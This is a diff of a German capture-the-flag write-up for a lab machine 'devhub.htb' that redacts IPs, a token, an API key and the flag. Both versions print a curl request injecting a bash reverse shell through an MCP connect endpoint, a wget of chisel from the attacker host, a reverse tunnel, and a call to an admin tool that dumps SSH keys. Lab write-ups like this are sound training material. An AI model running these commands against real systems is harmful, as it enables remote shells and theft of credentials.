@@ -23,7 +23,7 @@ Ergebnis:
 📌 2. Hosts-Datei anpassen
 bash
 
-echo "10.129.41.47 devhub.htb" >> /etc/hosts
+echo "10.x.x.x devhub.htb" >> /etc/hosts
 
 📌 3. Webseite erkunden
 
@@ -43,7 +43,7 @@ bash
 
 curl -X POST http://devhub.htb:6274/api/mcp/connect \
   -H "Content-Type: application/json" \
-  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.16.52/4444 0>&1"],"env":{}},"serverId":"mytest"}'
+  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.x.x.x/4444 0>&1"],"env":{}},"serverId":"mytest"}'
 
 ✅ Shell als mcp-dev
 📌 5. Chisel Tunnel einrichten
@@ -51,13 +51,13 @@ curl -X POST http://devhub.htb:6274/api/mcp/connect \
 HTTP-Server (Angreifer):
 bash
 
-python3 -m http.server 8000 --bind 10.10.16.52
+python3 -m http.server 8000 --bind 10.x.x.x
 
 Chisel auf Ziel herunterladen (mcp-dev-Shell):
 bash
 
 cd /tmp
-wget http://10.10.16.52:8000/chisel
+wget http://10.x.x.x:8000/chisel
 chmod +x chisel
 
 Chisel-Server (Angreifer):
@@ -68,7 +68,7 @@ bash
 Chisel-Client (mcp-dev-Shell):
 bash
 
-./chisel client 10.10.16.52:9001 R:8888:127.0.0.1:8888 &
+./chisel client 10.x.x.x:9001 R:8888:127.0.0.1:8888 &
 
 📌 6. Jupyter Zugriff
 
@@ -77,7 +77,7 @@ bash
 
 ps aux | grep jupyter | grep -v grep
 
-Token: a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
+Token: a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2xxxxxxxxxx
 
 Browser: http://localhost:8888/?token=...
 📌 7. Root-SSH-Key abrufen (in Jupyter)
@@ -86,7 +86,7 @@ python
 import requests, json
 
 url = "http://127.0.0.1:5000/tools/call"
-headers = {"X-API-Key": "opsmcp_secret_key_4f5a6b7c8d9e0f1a", "Content-Type": "application/json"}
+headers = {"X-API-Key": "opsmcp_secret_key_4f5a6b7xxxxxxxxx", "Content-Type": "application/json"}
 payload = {"name": "ops._admin_dump", "args": {"target": "ssh_keys", "confirm": True}}
 
 response = requests.post(url, headers=headers, json=payload)
@@ -109,7 +109,7 @@ cat /home/analyst/user.txt
 Root-Flag:
 text
 
-08be4cfb68597d0f9edfccaf5abc3344
+08be4cfb68597d0f9edfccxxxxxxxxxx
 
 🔗 Links
 
@@ -117,16 +117,8 @@ text
 
     Chisel
 
-Viel Erfolg beim Nachmachen! 🚀
+Viel Erfolg! 🚀
 text
 
 
 ---
-
-## ✅ **Fertig!**
-
-Jetzt hast du dein **DevHub-Writeup** sauber in GitHub.  
-Du kannst es später noch mit **Bildern** (Screenshots) ergänzen – einfach in den Ordner `images/` legen und im Markdown einbinden.
-
-**Alles erledigt – gut gemacht!** 😊🚀
-
